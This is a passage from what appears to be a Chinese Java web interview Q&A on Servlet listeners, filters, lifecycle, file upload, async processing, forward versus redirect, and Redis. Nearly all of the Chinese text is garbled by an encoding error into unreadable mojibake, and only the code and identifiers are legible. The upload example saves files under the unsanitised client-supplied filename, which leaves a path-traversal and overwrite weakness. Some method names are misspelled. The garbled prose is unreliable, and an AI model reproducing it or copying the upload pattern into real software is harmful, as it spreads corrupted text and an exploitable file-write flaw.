ä¿®æ”¹åˆ é™¤å±æ€§æ—¶è‡ªåŠ¨æ‰§è¡Œä»£ç çš„åŠŸèƒ½ç»„ä»¶ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼šâ‘ ServletContextListenerï¼šå¯¹Servletä¸Šä¸‹æ–‡çš„åˆ›å»ºå’Œé”€æ¯è¿›è¡Œç›‘å¬ã€‚â‘¡ServletContextAttributeListenerï¼šç›‘å¬Servletä¸Šä¸‹æ–‡å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢ã€‚â‘¢HttpSessionListenerï¼šå¯¹Sessionçš„åˆ›å»ºå’Œé”€æ¯è¿›è¡Œç›‘å¬ã€‚ sessionçš„é”€æ¯æœ‰ä¸¤ç§æƒ…å†µï¼š1). sessionè¶…æ—¶ï¼ˆå¯ä»¥åœ¨web.xmlä¸­é€šè¿‡/æ ‡ç­¾é…ç½®è¶…æ—¶æ—¶é—´ï¼‰ï¼›2). é€šè¿‡è°ƒç”¨sessionå¯¹è±¡çš„invalidate()æ–¹æ³•ä½¿sessionå¤±æ•ˆã€‚â‘£HttpSessionAttributeListenerï¼šå¯¹Sessionå¯¹è±¡ä¸­å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢è¿›è¡Œç›‘å¬ã€‚â‘¤ServletRequestListenerï¼šå¯¹è¯·æ±‚å¯¹è±¡çš„åˆå§‹åŒ–å’Œé”€æ¯è¿›è¡Œç›‘å¬ã€‚â‘¥ServletRequestAttributeListenerï¼šå¯¹è¯·æ±‚å¯¹è±¡å±æ€§çš„æ·»åŠ ã€åˆ é™¤å’Œæ›¿æ¢è¿›è¡Œç›‘å¬ã€‚ è¯·é—®è¿‡æ»¤å™¨æœ‰å“ªäº›ä½œç”¨ï¼Ÿä»¥åŠè¿‡æ»¤å™¨çš„ç”¨æ³•åˆæ˜¯ä»€ä¹ˆå‘¢?Java Webå¼€å‘ä¸­çš„è¿‡æ»¤å™¨ï¼ˆfilterï¼‰æ˜¯ä»Servlet 2.3è§„èŒƒå¼€å§‹å¢åŠ çš„åŠŸèƒ½ï¼Œå¹¶åœ¨Servlet 2.4è§„èŒƒä¸­å¾—åˆ°å¢å¼ºã€‚å¯¹Webåº”ç”¨æ¥è¯´ï¼Œè¿‡æ»¤å™¨æ˜¯ä¸€ä¸ªé©»ç•™åœ¨æœåŠ¡å™¨ç«¯çš„Webç»„ä»¶ï¼Œå®ƒå¯ä»¥æˆªå–å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„è¯·æ±‚ä¸å“åº”ä¿¡æ¯ï¼Œå¹¶å¯¹è¿™äº›ä¿¡æ¯è¿›è¡Œè¿‡æ»¤ã€‚å½“Webå®¹å™¨æ¥å—åˆ°ä¸€ä¸ªå¯¹èµ„æºçš„è¯·æ±‚æ—¶ï¼Œå®ƒå°†åˆ¤æ–­æ˜¯å¦æœ‰è¿‡æ»¤å™¨ä¸è¿™ä¸ªèµ„æºç›¸å…³è”ã€‚å¦‚æœæœ‰ï¼Œé‚£ä¹ˆå®¹å™¨å°†æŠŠè¯·æ±‚äº¤ç»™è¿‡æ»¤å™¨è¿›è¡Œå¤„ç†ã€‚åœ¨è¿‡æ»¤å™¨ä¸­ï¼Œä½ å¯ä»¥æ”¹å˜è¯·æ±‚çš„å†…å®¹ï¼Œæˆ–è€…é‡æ–°è®¾ç½®è¯·æ±‚çš„æŠ¥å¤´ä¿¡æ¯ï¼Œç„¶åå†å°†è¯·æ±‚å‘é€ç»™ç›®æ ‡èµ„æºã€‚å½“ç›®æ ‡èµ„æºå¯¹è¯·æ±‚ä½œå‡ºå“åº”æ—¶å€™ï¼Œå®¹å™¨åŒæ ·ä¼šå°†å“åº”å…ˆè½¬å‘ç»™è¿‡æ»¤å™¨ï¼Œåœ¨è¿‡æ»¤å™¨ä¸­ä½ å¯ä»¥å¯¹å“åº”çš„å†…å®¹è¿›è¡Œè½¬æ¢ï¼Œç„¶åå†å°†å“åº”å‘é€åˆ°å®¢æˆ·ç«¯ã€‚ å¸¸è§çš„è¿‡æ»¤å™¨ç”¨é€”ä¸»è¦åŒ…æ‹¬ï¼šå¯¹ç”¨æˆ·è¯·æ±‚è¿›è¡Œç»Ÿä¸€è®¤è¯ã€å¯¹ç”¨æˆ·çš„è®¿é—®è¯·æ±‚è¿›è¡Œè®°å½•å’Œå®¡æ ¸ã€å¯¹ç”¨æˆ·å‘é€çš„æ•°æ®è¿›è¡Œè¿‡æ»¤æˆ–æ›¿æ¢ã€è½¬æ¢å›¾è±¡æ ¼å¼ã€å¯¹å“åº”å†…å®¹è¿›è¡Œå‹ç¼©ä»¥å‡å°‘ä¼ è¾“é‡ã€å¯¹è¯·æ±‚æˆ–å“åº”è¿›è¡ŒåŠ è§£å¯†å¤„ç†ã€è§¦å‘èµ„æºè®¿é—®äº‹ä»¶ã€å¯¹XMLçš„è¾“å‡ºåº”ç”¨XSLTç­‰ã€‚å’Œè¿‡æ»¤å™¨ç›¸å…³çš„æ¥å£ä¸»è¦æœ‰ï¼šFilterã€FilterConfigå’ŒFilterChainã€‚ è¯·é—®ä½¿ç”¨Servletå¦‚ä½•è·å–ç”¨æˆ·é…ç½®çš„åˆå§‹åŒ–å‚æ•°ä»¥åŠæœåŠ¡å™¨ä¸Šä¸‹æ–‡å‚æ•°ï¼Ÿ å¯ä»¥é€šè¿‡é‡å†™Servletæ¥å£çš„init(ServletConfig)æ–¹æ³•å¹¶é€šè¿‡ServletConfigå¯¹è±¡çš„getInitParameter()æ–¹æ³•æ¥è·å–Servletçš„åˆå§‹åŒ–å‚æ•°ã€‚å¯ä»¥é€šè¿‡ServletConfigå¯¹è±¡çš„getServletContext()æ–¹æ³•è·å–ServletContextå¯¹è±¡ï¼Œå¹¶é€šè¿‡è¯¥å¯¹è±¡çš„getInitParameter()æ–¹æ³•æ¥è·å–æœåŠ¡å™¨ä¸Šä¸‹æ–‡å‚æ•°ã€‚å½“ç„¶ï¼ŒServletContextå¯¹è±¡ä¹Ÿåœ¨å¤„ç†ç”¨æˆ·è¯·æ±‚çš„æ–¹æ³•ï¼ˆå¦‚doGet()æ–¹æ³•ï¼‰ä¸­é€šè¿‡è¯·æ±‚å¯¹è±¡çš„getServletContext()æ–¹æ³•æ¥è·å¾—ã€‚ è¯·é—®ä½¿ç”¨Servletå¦‚ä½•è·å–ç”¨æˆ·æäº¤çš„æŸ¥è¯¢å‚æ•°ä»¥åŠè¡¨å•æ•°æ®ï¼Ÿå¯ä»¥é€šè¿‡è¯·æ±‚å¯¹è±¡ï¼ˆHttpServletRequestï¼‰çš„getParameter()æ–¹æ³•é€šè¿‡å‚æ•°åè·å¾—å‚æ•°å€¼ã€‚å¦‚æœæœ‰åŒ…å«å¤šä¸ªå€¼çš„å‚æ•°ï¼ˆä¾‹å¦‚å¤é€‰æ¡†ï¼‰ï¼Œå¯ä»¥é€šè¿‡è¯·æ±‚å¯¹è±¡çš„getParameterValues()æ–¹æ³•è·å¾—ã€‚å½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡è¯·æ±‚å¯¹è±¡çš„getParameterMap()è·å¾—ä¸€ä¸ªå‚æ•°åå’Œå‚æ•°å€¼çš„æ˜ å°„ï¼ˆMapï¼‰ã€‚ æœåŠ¡å™¨æ”¶åˆ°ç”¨æˆ·æäº¤çš„è¡¨å•æ•°æ®ï¼Œè¯·é—®è°ƒç”¨äº†ä»¥ä¸‹æ–¹æ³•ä¸­çš„å“ªä¸€ä¸ªæ–¹æ³•ï¼Ÿç¬¬ä¸€ä¸ªæ˜¯Servletä¸­çš„doGet()æ–¹æ³•ï¼Œç¬¬äºŒä¸ªServletä¸­çš„æ˜¯doPost()æ–¹æ³•HTMLçš„å…ƒç´ æœ‰ä¸€ä¸ªmethodå±æ€§ï¼Œç”¨æ¥æŒ‡å®šæäº¤è¡¨å•çš„æ–¹å¼ï¼Œå…¶å€¼å¯ä»¥æ˜¯getæˆ–postã€‚æˆ‘ä»¬è‡ªå®šä¹‰çš„Servletä¸€èˆ¬æƒ…å†µä¸‹ä¼šé‡å†™doGet()æˆ–doPost()ä¸¤ä¸ªæ–¹æ³•ä¹‹ä¸€æˆ–å…¨éƒ¨ï¼Œå¦‚æœæ˜¯GETè¯·æ±‚å°±è°ƒç”¨doGet()æ–¹æ³•ï¼Œå¦‚æœæ˜¯POSTè¯·æ±‚å°±è°ƒç”¨doPost()æ–¹æ³•ï¼Œé‚£ä¸ºä»€ä¹ˆä¸ºä»€ä¹ˆè¿™æ ·å‘¢ï¼Ÿæˆ‘ä»¬è‡ªå®šä¹‰çš„Servleté€šå¸¸ç»§æ‰¿è‡ªHttpServletï¼ŒHttpServletç»§æ‰¿è‡ªGenericServletå¹¶é‡å†™äº†å…¶ä¸­çš„service()æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯Servletæ¥å£ä¸­å®šä¹‰çš„ã€‚HttpServleté‡å†™çš„service()æ–¹æ³•ä¼šå…ˆè·å–ç”¨æˆ·è¯·æ±‚çš„æ–¹æ³•ï¼Œç„¶åæ ¹æ®è¯·æ±‚æ–¹æ³•è°ƒç”¨doGet()ã€doPost()ã€doPut()ã€doDelete()ç­‰æ–¹æ³•ï¼Œå¦‚æœåœ¨è‡ªå®šä¹‰Servletä¸­é‡å†™äº†è¿™äº›æ–¹æ³•ï¼Œé‚£ä¹ˆæ˜¾ç„¶ä¼šè°ƒç”¨é‡å†™è¿‡çš„ï¼ˆè‡ªå®šä¹‰çš„ï¼‰æ–¹æ³•ï¼Œè¿™æ˜¾ç„¶æ˜¯å¯¹æ¨¡æ¿æ–¹æ³•æ¨¡å¼çš„åº”ç”¨ï¼ˆå¦‚æœä¸ç†è§£ï¼Œè¯·å‚è€ƒé˜å®åšå£«çš„ã€ŠJavaä¸æ¨¡å¼ã€‹ä¸€ä¹¦çš„ç¬¬37ç« ï¼‰ã€‚å½“ç„¶ï¼Œè‡ªå®šä¹‰Servletä¸­ä¹Ÿå¯ä»¥ç›´æ¥é‡å†™service()æ–¹æ³•ï¼Œé‚£ä¹ˆä¸ç®¡æ˜¯å“ªç§æ–¹å¼çš„è¯·æ±‚ï¼Œéƒ½å¯ä»¥é€šè¿‡è‡ªå·±çš„ä»£ç è¿›è¡Œå¤„ç†ï¼Œè¿™å¯¹äºä¸åŒºåˆ†è¯·æ±‚æ–¹æ³•çš„åœºæ™¯æ¯”è¾ƒåˆé€‚ã€‚ è¯·é—®å¦‚ä½•åœ¨åŸºäºJavaçš„Webé¡¹ç›®ä¸­å®ç°æ–‡ä»¶ä¸Šä¼ å’Œä¸‹è½½ï¼Ÿåœ¨Sevlet 3 ä»¥å‰ï¼ŒServlet APIä¸­æ²¡æœ‰æ”¯æŒä¸Šä¼ åŠŸèƒ½çš„APIï¼Œå› æ­¤è¦å®ç°ä¸Šä¼ åŠŸèƒ½éœ€è¦å¼•å…¥ç¬¬ä¸‰æ–¹å·¥å…·ä»POSTè¯·æ±‚ä¸­è·å¾—ä¸Šä¼ çš„é™„ä»¶æˆ–è€…é€šè¿‡è‡ªè¡Œå¤„ç†è¾“å…¥æµæ¥è·å¾—ä¸Šä¼ çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬æ¨èä½¿ç”¨Apacheçš„commons-fileuploadã€‚ä»Servlet 3å¼€å§‹ï¼Œæ–‡ä»¶ä¸Šä¼ å˜å¾—ç®€å•è®¸å¤šã€‚ package com.jackfrued.servlet; import java.io.IOException; import javax.servlet.ServletException; import javax.servlet.annotation.MultipartConfig; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.Part; @WebServlet(&quot;/UploadServlet&quot;) @MultipartConfig public class UploadServlet extends HttpServlet { private static final long serialVersionUID = 1L; protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { // å¯ä»¥ç”¨request.getPart()æ–¹æ³•è·å¾—åä¸ºphotoçš„ä¸Šä¼ é™„ä»¶ // ä¹Ÿå¯ä»¥ç”¨request.getParts()è·å¾—æ‰€æœ‰ä¸Šä¼ é™„ä»¶ï¼ˆå¤šæ–‡ä»¶ä¸Šä¼ ï¼‰ // ç„¶åé€šè¿‡å¾ªç¯åˆ†åˆ«å¤„ç†æ¯ä¸€ä¸ªä¸Šä¼ çš„æ–‡ä»¶ Part part = request.getPart(&quot;photo&quot;); if (part != null &amp;&amp; part.getSubmittedFileName().length() &gt; 0) { // ç”¨ServletContextå¯¹è±¡çš„getRealPath()æ–¹æ³•è·å¾—ä¸Šä¼ æ–‡ä»¶å¤¹çš„ç»å¯¹è·¯å¾„ String savePath = request.getServletContext().getRealPath(&quot;/upload&quot;); // Servlet 3.1è§„èŒƒä¸­å¯ä»¥ç”¨Partå¯¹è±¡çš„getSubmittedFileName()æ–¹æ³•è·å¾—ä¸Šä¼ çš„æ–‡ä»¶å // æ›´å¥½çš„åšæ³•æ˜¯ä¸ºä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œé‡å‘½åï¼ˆé¿å…åŒåæ–‡ä»¶çš„ç›¸äº’è¦†ç›–ï¼‰ part.write(savePath + &quot;/&quot; + part.getSubmittedFileName()); request.setAttribute(&quot;hint&quot;, &quot;Upload Successfully!&quot;); } else { request.setAttribute(&quot;hint&quot;, &quot;Upload failed!&quot;); } // è·³è½¬å›åˆ°ä¸Šä¼ é¡µé¢ request.getRequestDispatcher(&quot;index.jsp&quot;).forward(request, response); } } è¯´æ˜ä¸€ä¸‹Servlet 3ä¸­çš„å¼‚æ­¥å¤„ç†æŒ‡çš„æ˜¯ä»€ä¹ˆï¼Ÿåœ¨Servlet 3ä¸­å¼•å…¥äº†ä¸€é¡¹æ–°çš„æŠ€æœ¯å¯ä»¥è®©Servletå¼‚æ­¥å¤„ç†è¯·æ±‚ã€‚æœ‰äººå¯èƒ½ä¼šè´¨ç–‘ï¼Œæ—¢ç„¶éƒ½æœ‰å¤šçº¿ç¨‹äº†ï¼Œè¿˜éœ€è¦å¼‚æ­¥å¤„ç†è¯·æ±‚å—ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œå› ä¸ºå¦‚æœä¸€ä¸ªä»»åŠ¡å¤„ç†æ—¶é—´ç›¸å½“é•¿ï¼Œé‚£ä¹ˆServletæˆ–Filterä¼šä¸€ç›´å ç”¨ç€è¯·æ±‚å¤„ç†çº¿ç¨‹ç›´åˆ°ä»»åŠ¡ç»“æŸï¼Œéšç€å¹¶å‘ç”¨æˆ·çš„å¢åŠ ï¼Œå®¹å™¨å°†ä¼šé­é‡çº¿ç¨‹è¶…å‡ºçš„é£é™©ï¼Œè¿™è¿™ç§æƒ…å†µä¸‹å¾ˆå¤šçš„è¯·æ±‚å°†ä¼šè¢«å †ç§¯èµ·æ¥è€Œåç»­çš„è¯·æ±‚å¯èƒ½ä¼šé­é‡æ‹’ç»æœåŠ¡ï¼Œç›´åˆ°æœ‰èµ„æºå¯ä»¥å¤„ç†è¯·æ±‚ä¸ºæ­¢ã€‚å¼‚æ­¥ç‰¹æ€§å¯ä»¥å¸®åŠ©åº”ç”¨èŠ‚çœå®¹å™¨ä¸­çš„çº¿ç¨‹ï¼Œç‰¹åˆ«é€‚åˆæ‰§è¡Œæ—¶é—´é•¿è€Œä¸”ç”¨æˆ·éœ€è¦å¾—åˆ°ç»“æœçš„ä»»åŠ¡ï¼Œå¦‚æœç”¨æˆ·ä¸éœ€è¦å¾—åˆ°ç»“æœåˆ™ç›´æ¥å°†ä¸€ä¸ªRunnableå¯¹è±¡äº¤ç»™Executorå¹¶ç«‹å³è¿”å›å³å¯ã€‚ import java.io.IOException; import javax.servlet.AsyncContext; import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; @WebServlet(urlPatterns = {&quot;/async&quot;}, asyncSupported = true) public class AsyncServlet extends HttpServlet { private static final long serialVersionUID = 1L; @Override public void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { // å¼€å¯Tomcatå¼‚æ­¥Servletæ”¯æŒ req.setAttribute(&quot;org.apache.catalina.ASYNC_SUPPORTED&quot;, true); final AsyncContext ctx = req.startAsync(); // å¯åŠ¨å¼‚æ­¥å¤„ç†çš„ä¸Šä¸‹æ–‡ // ctx.setTimeout(30000); ctx.start(new Runnable() { @Override public void run() { // åœ¨æ­¤å¤„æ·»åŠ å¼‚æ­¥å¤„ç†çš„ä»£ç  ctx.complete(); } }); } } è¯´è¯´Servletæ¥å£ä¸­æœ‰å“ªäº›æ–¹æ³•ï¼ŸServletæ¥å£å®šä¹‰äº†5ä¸ªæ–¹æ³•ï¼Œå…¶ä¸­å‰ä¸‰ä¸ªæ–¹æ³•ä¸Servletç”Ÿå‘½å‘¨æœŸç›¸å…³ï¼š- void init(ServletConfig config) throws ServletException- void service(ServletRequest req, ServletResponse resp) throws ServletException, java.io.IOException- void destory()- java.lang.String getServletInfo()- ServletConfig getServletConfig()Webå®¹å™¨åŠ è½½Servletå¹¶å°†å…¶å®ä¾‹åŒ–åï¼ŒServletç”Ÿå‘½å‘¨æœŸå¼€å§‹ï¼Œå®¹å™¨è¿è¡Œå…¶init()æ–¹æ³•è¿›è¡ŒServletçš„åˆå§‹åŒ–ï¼›è¯·æ±‚åˆ°è¾¾æ—¶è°ƒç”¨Servletçš„service()æ–¹æ³•ï¼Œservice()æ–¹æ³•ä¼šæ ¹æ®éœ€è¦è°ƒç”¨ä¸è¯·æ±‚å¯¹åº”çš„doGetæˆ–doPostç­‰æ–¹æ³•ï¼›å½“æœåŠ¡å™¨å…³é—­æˆ–é¡¹ç›®è¢«å¸è½½æ—¶æœåŠ¡å™¨ä¼šå°†Servletå®ä¾‹é”€æ¯ï¼Œæ­¤æ—¶ä¼šè°ƒç”¨Servletçš„destroy()æ–¹æ³•ã€‚ é˜è¿°ä¸€ä¸‹é˜è¿°Servletå’ŒCGIçš„åŒºåˆ«? Servletä¸CGIçš„åŒºåˆ«åœ¨äºServletå¤„äºæœåŠ¡å™¨è¿›ç¨‹ä¸­ï¼Œå®ƒé€šè¿‡å¤šçº¿ç¨‹æ–¹å¼è¿è¡Œå…¶service()æ–¹æ³•ï¼Œä¸€ä¸ªå®ä¾‹å¯ä»¥æœåŠ¡äºå¤šä¸ªè¯·æ±‚ï¼Œå¹¶ä¸”å…¶å®ä¾‹ä¸€èˆ¬ä¸ä¼šé”€æ¯ï¼Œè€ŒCGIå¯¹æ¯ä¸ªè¯·æ±‚éƒ½äº§ç”Ÿæ–°çš„è¿›ç¨‹ï¼ŒæœåŠ¡å®Œæˆåå°±é”€æ¯ï¼Œæ‰€ä»¥æ•ˆç‡ä¸Šä½äºServletã€‚ åœ¨Servletæ‰§è¡Œçš„è¿‡ç¨‹ä¸­ï¼Œä¸€èˆ¬å®ç°å“ªå‡ ä¸ªæ–¹æ³•ï¼Ÿpublic void init(ServletConfig config)public ServletConfig getServletConfig()public String getServletInfo()public void service(ServletRequest request,ServletResponse response) public void destroy()init ()æ–¹æ³•åœ¨servletçš„ç”Ÿå‘½å‘¨æœŸä¸­ä»…æ‰§è¡Œä¸€æ¬¡ï¼Œåœ¨æœåŠ¡å™¨è£…è½½servletæ—¶æ‰§è¡Œã€‚ç¼ºçœçš„init()æ–¹æ³•é€šå¸¸æ˜¯ç¬¦åˆè¦æ±‚çš„ï¼Œä¸è¿‡ä¹Ÿå¯ä»¥æ ¹æ®éœ€è¦è¿›è¡Œ overrideï¼Œæ¯”å¦‚ç®¡ç†æœåŠ¡å™¨ç«¯èµ„æºï¼Œä¸€æ¬¡æ€§è£…å…¥GIFå›¾åƒï¼Œåˆå§‹åŒ–æ•°æ®åº“è¿æ¥ç­‰ï¼Œç¼ºçœçš„inti()æ–¹æ³•è®¾ç½®äº†servletçš„åˆå§‹åŒ–å‚æ•°ï¼Œå¹¶ç”¨å®ƒçš„ServeltConfigå¯¹è±¡å‚æ•°æ¥å¯åŠ¨é…ç½®ï¼Œæ‰€ä»¥è¦†ç›–init()æ–¹æ³•æ—¶ï¼Œåº”è°ƒç”¨super.init()ä»¥ç¡®ä¿ä»ç„¶æ‰§è¡Œè¿™äº›ä»»åŠ¡ã€‚service ()æ–¹æ³•æ˜¯servletçš„æ ¸å¿ƒï¼Œåœ¨è°ƒç”¨service()æ–¹æ³•ä¹‹å‰ï¼Œåº”ç¡®ä¿å·²å®Œæˆinit()æ–¹æ³•ã€‚å¯¹äºHttpServletï¼Œæ¯å½“å®¢æˆ·è¯·æ±‚ä¸€ä¸ªHttpServletå¯¹è±¡ï¼Œè¯¥å¯¹è±¡çš„service()æ–¹æ³•å°±è¦è¢«è°ƒç”¨ï¼ŒHttpServletç¼ºçœçš„service()æ–¹æ³•çš„æœåŠ¡åŠŸèƒ½å°±æ˜¯è°ƒç”¨ä¸ HTTPè¯·æ±‚çš„æ–¹æ³•ç›¸åº”çš„doåŠŸèƒ½ï¼ŒdoPost()å’ŒdoGet()ï¼Œæ‰€ä»¥å¯¹äºHttpServletï¼Œä¸€èˆ¬éƒ½æ˜¯é‡å†™doPost()å’ŒdoGet() æ–¹æ³•ã€‚destroy()æ–¹æ³•åœ¨servletçš„ç”Ÿå‘½å‘¨æœŸä¸­ä¹Ÿä»…æ‰§è¡Œä¸€æ¬¡ï¼Œå³åœ¨æœåŠ¡å™¨åœæ­¢å¸è½½servletæ—¶æ‰§è¡Œï¼ŒæŠŠservletä½œä¸ºæœåŠ¡å™¨è¿›ç¨‹çš„ä¸€éƒ¨åˆ†å…³é—­ã€‚ç¼ºçœçš„destroy()æ–¹æ³•é€šå¸¸æ˜¯ç¬¦åˆè¦æ±‚çš„ï¼Œä½†ä¹Ÿå¯ä»¥overrideï¼Œæ¯”å¦‚åœ¨å¸è½½servletæ—¶å°†ç»Ÿè®¡æ•°å­—ä¿å­˜åœ¨æ–‡ä»¶ä¸­ï¼Œæˆ–æ˜¯å…³é—­æ•°æ®åº“è¿æ¥getServletConfig()æ–¹æ³•è¿”å›ä¸€ä¸ªservletConfigå¯¹è±¡ï¼Œè¯¥å¯¹è±¡ç”¨æ¥è¿”å›åˆå§‹åŒ–å‚servletContextã€‚servletContextæ¥å£æä¾›æœ‰å…³servletçš„ç¯å¢ƒä¿¡æ¯ã€‚getServletInfo()æ–¹æ³•æä¾›æœ‰å…³servletçš„ä¿¡æ¯ï¼Œå¦‚ä½œè€…ï¼Œç‰ˆæœ¬ï¼Œç‰ˆæƒã€‚ è¯·è¯´å‡ºServletçš„ç”Ÿå‘½å‘¨æœŸæ˜¯ä»€ä¹ˆæ ·çš„ï¼Ÿå¹¶ä¸”è¯·åˆ†æä¸€ä¸‹Servletå’ŒCGIçš„åŒºåˆ«ã€‚ Servletè¢«æœåŠ¡å™¨å®ä¾‹åŒ–åï¼Œå®¹å™¨è¿è¡Œå…¶initæ–¹æ³•ï¼Œè¯·æ±‚åˆ°è¾¾æ—¶è¿è¡Œå…¶serviceæ–¹æ³•ï¼Œserviceæ–¹æ³•è‡ªåŠ¨æ´¾é£è¿è¡Œä¸è¯·æ±‚å¯¹åº”çš„doXXXæ–¹æ³•ï¼ˆdoGetï¼ŒdoPostï¼‰ç­‰ï¼Œå½“æœåŠ¡å™¨å†³å®šå°†å®ä¾‹é”€æ¯çš„æ—¶å€™è°ƒç”¨å…¶destroyæ–¹æ³•ã€‚ä¸cgiçš„åŒºåˆ«åœ¨äºservletå¤„äºæœåŠ¡å™¨è¿›ç¨‹ä¸­ï¼Œå®ƒé€šè¿‡å¤šçº¿ç¨‹æ–¹å¼è¿è¡Œå…¶serviceæ–¹æ³•ï¼Œä¸€ä¸ªå®ä¾‹å¯ä»¥æœåŠ¡äºå¤šä¸ªè¯·æ±‚ï¼Œå¹¶ä¸”å…¶å®ä¾‹ä¸€èˆ¬ä¸ä¼šé”€æ¯ï¼Œè€ŒCGIå¯¹æ¯ä¸ªè¯·æ±‚éƒ½äº§ç”Ÿæ–°çš„è¿›ç¨‹ï¼ŒæœåŠ¡å®Œæˆåå°±é”€æ¯ï¼Œæ‰€ä»¥æ•ˆç‡ä¸Šä½äºservletã€‚ å›ç­”ä¸€ä¸‹servletçš„ç”Ÿå‘½å‘¨æœŸæ˜¯ä»€ä¹ˆã€‚servletæ˜¯å¦ä¸ºå•ä¾‹ä»¥åŠåŸå› æ˜¯ä»€ä¹ˆï¼ŸServlet ç”Ÿå‘½å‘¨æœŸå¯è¢«å®šä¹‰ä¸ºä»åˆ›å»ºç›´åˆ°æ¯ç­çš„æ•´ä¸ªè¿‡ç¨‹ã€‚ä»¥ä¸‹æ˜¯ Servlet éµå¾ªçš„è¿‡ç¨‹ï¼š Servlet é€šè¿‡è°ƒç”¨ init () æ–¹æ³•è¿›è¡Œåˆå§‹åŒ–ã€‚ Servlet è°ƒç”¨ service() æ–¹æ³•æ¥å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚ Servlet é€šè¿‡è°ƒç”¨ destroy() æ–¹æ³•ç»ˆæ­¢ï¼ˆç»“æŸï¼‰ã€‚ æœ€åï¼ŒServlet æ˜¯ç”± JVM çš„åƒåœ¾å›æ”¶å™¨è¿›è¡Œåƒåœ¾å›æ”¶çš„ã€‚ Servletå•å®ä¾‹ï¼Œå‡å°‘äº†äº§ç”Ÿservletçš„å¼€é”€ï¼› ç®€è¦è¯´æ˜ä¸€ä¸‹forwardä¸redirectåŒºåˆ«ï¼Œå¹¶ä¸”è¯´ä¸€ä¸‹ä½ çŸ¥é“çš„çŠ¶æ€ç éƒ½æœ‰å“ªäº›ï¼Ÿä»¥åŠredirectçš„çŠ¶æ€ç åˆæ˜¯å¤šå°‘ï¼Ÿ1.ä»åœ°å€æ æ˜¾ç¤ºæ¥è¯´ forwardæ˜¯æœåŠ¡å™¨è¯·æ±‚èµ„æº,æœåŠ¡å™¨ç›´æ¥è®¿é—®ç›®æ ‡åœ°å€çš„URL,æŠŠé‚£ä¸ªURLçš„å“åº”å†…å®¹è¯»å–è¿‡æ¥,ç„¶åæŠŠè¿™äº›å†…å®¹å†å‘ç»™æµè§ˆå™¨.æµè§ˆå™¨æ ¹æœ¬ä¸çŸ¥é“æœåŠ¡å™¨å‘é€çš„å†…å®¹ä»å“ªé‡Œæ¥çš„,æ‰€ä»¥å®ƒçš„åœ°å€æ è¿˜æ˜¯åŸæ¥çš„åœ°å€. redirectæ˜¯æœåŠ¡ç«¯æ ¹æ®é€»è¾‘,å‘é€ä¸€ä¸ªçŠ¶æ€ç ,å‘Šè¯‰æµè§ˆå™¨é‡æ–°å»è¯·æ±‚é‚£ä¸ªåœ°å€.æ‰€ä»¥åœ°å€æ æ˜¾ç¤ºçš„æ˜¯æ–°çš„URL. 2.ä»æ•°æ®å…±äº«æ¥è¯´ forward:è½¬å‘é¡µé¢å’Œè½¬å‘åˆ°çš„é¡µé¢å¯ä»¥å…±äº«requesté‡Œé¢çš„æ•°æ®. redirect:ä¸èƒ½å…±äº«æ•°æ®. 3.ä»è¿ç”¨åœ°æ–¹æ¥è¯´ forward:ä¸€èˆ¬ç”¨äºç”¨æˆ·ç™»é™†çš„æ—¶å€™,æ ¹æ®è§’è‰²è½¬å‘åˆ°ç›¸åº”çš„æ¨¡å—. redirect:ä¸€èˆ¬ç”¨äºç”¨æˆ·æ³¨é”€ç™»é™†æ—¶è¿”å›ä¸»é¡µé¢å’Œè·³è½¬åˆ°å…¶å®ƒçš„ç½‘ç«™ç­‰. 4.ä»æ•ˆç‡æ¥è¯´ forward:é«˜. redirect:ä½. redirectçš„çŠ¶æ€ç æ˜¯302 è¯·é—®redisçš„Listèƒ½åœ¨ä»€ä¹ˆåœºæ™¯ä¸‹ä½¿ç”¨ï¼Ÿ Redis ä¸­listçš„æ•°æ®ç»“æ„å®ç°æ˜¯åŒå‘é“¾è¡¨ï¼Œæ‰€ä»¥å¯ä»¥éå¸¸ä¾¿æ·çš„åº”ç”¨äºæ¶ˆæ¯é˜Ÿåˆ—ï¼ˆç”Ÿäº§è€… / æ¶ˆè´¹è€…æ¨¡å‹ï¼‰ã€‚æ¶ˆæ¯çš„ç”Ÿäº§è€…åªéœ€è¦é€šè¿‡lpushå°†æ¶ˆæ¯æ”¾å…¥ listï¼Œæ¶ˆè´¹è€…ä¾¿å¯ä»¥é€šè¿‡rpopå–å‡ºè¯¥æ¶ˆæ¯ï¼Œå¹¶ä¸”å¯ä»¥ä¿è¯æ¶ˆæ¯çš„æœ‰åºæ€§ã€‚å¦‚æœéœ€è¦å®ç°å¸¦æœ‰ä¼˜å…ˆçº§çš„æ¶ˆæ¯é˜Ÿåˆ—ä¹Ÿå¯ä»¥é€‰æ‹©sorted setã€‚è€Œpub/subåŠŸèƒ½ä¹Ÿå¯ä»¥ç”¨ä½œå‘å¸ƒè€… / è®¢é˜…è€…æ¨¡å‹çš„æ¶ˆæ¯ã€‚ åˆ†åˆ«ä»‹ç»ä¸€ä¸‹aofå’Œrdbéƒ½æœ‰å“ªäº›ä¼˜ç‚¹ï¼Ÿä»¥åŠä¸¤è€…æœ‰ä½•åŒºåˆ«ï¼ŸRDB æŒä¹…åŒ–å¯ä»¥åœ¨æŒ‡å®šçš„æ—¶é—´é—´éš”å†…ç”Ÿæˆæ•°æ®é›†çš„æ—¶é—´ç‚¹å¿«ç…§ï¼ˆpoint-in-time snapshotï¼‰ã€‚ AOF 